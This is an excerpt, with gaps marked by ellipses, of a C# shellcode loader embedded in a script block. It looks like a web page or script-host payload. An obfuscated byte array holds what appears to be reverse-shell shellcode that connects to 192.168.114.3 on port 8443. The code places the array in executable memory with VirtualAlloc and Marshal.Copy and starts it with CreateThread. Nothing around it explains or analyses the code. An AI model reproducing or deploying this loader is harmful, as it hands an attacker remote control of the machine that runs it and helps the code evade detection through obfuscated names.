...
0x68,0xc0,0xa8,0x72,0x03,0x68,0x02,0x00,0x20,0xfb,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,
...
0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
        ...
        IntPtr el2Fy45c2x7 = VirtualAlloc(IntPtr.Zero,(UIntPtr)kxI_aw.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(kxI_aw,0,el2Fy45c2x7,kxI_aw.Length);
        IntPtr nZp8vr4I = IntPtr.Zero;
        IntPtr qk6_vXf6 = CreateThread(IntPtr.Zero,UIntPtr.Zero,el2Fy45c2x7,IntPtr.Zero,0,ref nZp8vr4I);
    }
</script>
